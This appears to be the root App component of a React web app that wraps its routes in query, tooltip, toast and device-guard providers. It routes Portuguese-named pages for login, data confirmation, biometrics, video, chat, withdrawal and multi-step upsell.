import { Toaster } from "@/components/ui/toaster";
import { Toaster as Sonner } from "@/components/ui/sonner";
import { TooltipProvider } from "@/components/ui/tooltip";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { BrowserRouter, Routes, Route } from "react-router-dom";
import DeviceGuard from "./components/DeviceGuard";
import Login from "./pages/Login";
import Verificando from "./pages/Verificando";
import ConfirmaDados from "./pages/ConfirmaDados";
import Biometria from "./pages/Biometria";
import Video from "./pages/Video";
import Chat from "./pages/Chat";
import Saque from "./pages/Saque";
import Upsell from "./pages/Upsell";
import NotFound from "./pages/NotFound";

const queryClient = new QueryClient();

const App = () => (
  <QueryClientProvider client={queryClient}>
    <TooltipProvider>
      <Toaster />
      <Sonner />
      <DeviceGuard>
        <BrowserRouter>
          <Routes>
            <Route path="/" element={<Login />} />
            <Route path="/verificando" element={<Verificando />} />
            <Route path="/confirma-dados" element={<ConfirmaDados />} />
            <Route path="/biometria" element={<Biometria />} />
            <Route path="/video" element={<Video />} />
            <Route path="/chat" element={<Chat />} />
            <Route path="/saque" element={<Saque />} />
            <Route path="/upsell/:step" element={<Upsell />} />
            {/* ADD ALL CUSTOM ROUTES ABOVE THE CATCH-ALL "*" ROUTE */}
            <Route path="*" element={<NotFound />} />
          </Routes>
        </BrowserRouter>
      </DeviceGuard>
    </TooltipProvider>
  </QueryClientProvider>
);

export default App;
